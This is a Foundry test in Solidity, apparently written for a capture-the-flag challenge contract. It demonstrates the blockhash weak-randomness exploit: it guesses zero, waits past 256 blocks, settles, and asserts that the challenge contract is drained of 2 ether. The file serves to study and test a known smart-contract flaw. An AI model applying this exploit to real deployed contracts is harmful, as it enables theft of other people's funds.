
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public challenge;
    address public attacker;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
    }

    function test_highlightPredictableRandomValue(uint256 initialBlockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure block number is reasonable and won't overflow when we add 257
        vm.assume(initialBlockNumber > 0 && initialBlockNumber < type(uint256).max - 300);
        
        // --- 2. State Configuration ---
        
        // Set initial block number
        vm.roll(initialBlockNumber);
        
        vm.startPrank(attacker);
        
        // The vulnerability: blockhash() returns 0 for blocks older than 256 blocks
        // If we wait more than 256 blocks after locking in our guess,
        // blockhash(guessBlock) will return bytes32(0)
        // So we can predict the answer by guessing bytes32(0)
        
        bytes32 predictedAnswer = bytes32(0);
        
        // Lock in our guess with the predicted value (0)
        challenge.lockInGuess{value: 1 ether}(predictedAnswer);
        
        // The guess is locked for block.number + 1
        uint256 guessBlock = initialBlockNumber + 1;
        
        // We need to wait more than 256 blocks so blockhash returns 0
        // Roll forward 257 blocks from the guess block
        vm.roll(guessBlock + 257);
        
        // --- 3. Replication & Assertion ---
        
        // Verify our prediction: blockhash for blocks older than 256 returns 0
        bytes32 actualBlockhash = blockhash(guessBlock);
        assertEq(actualBlockhash, bytes32(0), "Blockhash should be 0 for old blocks");
        
        // Record balance before settlement
        uint256 balanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(challenge).balance;
        
        // Execute the settle function
        challenge.settle();
        
        vm.stopPrank();
        
        // Assert that we won - attacker received 2 ether
        uint256 balanceAfter = attacker.balance;
        assertEq(balanceAfter, balanceBefore + 2 ether, "Attacker should have received 2 ether");
        
        // Contract should be drained
        assertEq(address(challenge).balance, contractBalanceBefore - 2 ether, "Contract should have paid out");
    }
    
}
